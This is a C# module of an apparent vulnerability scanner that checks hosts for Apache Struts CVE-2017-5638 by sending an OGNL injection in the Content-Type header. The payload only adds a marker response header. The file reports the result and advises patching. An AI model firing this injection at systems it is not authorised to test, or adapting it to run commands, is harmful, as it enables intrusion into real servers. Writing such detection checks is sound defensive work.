using System;
using System.Net.Http;
using AetherSec.Core;

namespace AetherSec.Modules
{
	public class ApacheStrutsCVE20175638Exploit : IScanModule
	{
		public string Name => "Apache Struts CVE-2017-5638 Detection";
		public string Description => "Detects Apache Struts vulnerability via CVE-2017-5638 by injecting into Content-Type header.";
		public ScanSeverity Severity => ScanSeverity.Critical;

		public async Task<ScanResult> RunAsync(string targetHost)
		{
			try
			{
				using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(5) };
				var url = $"http://{targetHost}/struts2-showcase/index.action";

				var request = new HttpRequestMessage(HttpMethod.Get, url);
				request.Headers.TryAddWithoutValidation("Content-Type",
					"%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Struts-Check','Vulnerable')}");

				var response = await client.SendAsync(request);

				if (response.Headers.Contains("X-Struts-Check"))
				{
					return new ScanResult(
						true,
						"Apache Struts CVE-2017-5638 vulnerability detected (header injection successful).",
						targetHost,
						AffectedService: "Apache Struts",
						Recommendation: "Patch to Apache Struts 2.3.32 or later.",
						Severity: ScanSeverity.Critical,
						Vulnerability: "CVE-2017-5638"
					);
				}

				if (response.Headers.Server != null && response.Headers.Server.ToString().ToLower().Contains("struts"))
				{
					return new ScanResult(
						true,
						"Apache Struts detected. Patch status unknown.",
						targetHost,
						AffectedService: "Apache Struts",
						Recommendation: "Verify server patch level.",
						Severity: ScanSeverity.Medium
					);
				}

				return new ScanResult(
					false,
					"Struts exploit test failed or target not vulnerable.",
					targetHost
				);
			}
			catch (HttpRequestException hre)
			{
				return new ScanResult(false, $"HTTP request failed: {hre.Message}", targetHost);
			}
			catch (Exception ex)
			{
				return new ScanResult(false, $"Detection error: {ex.Message}", targetHost);
			}
		}

	}
}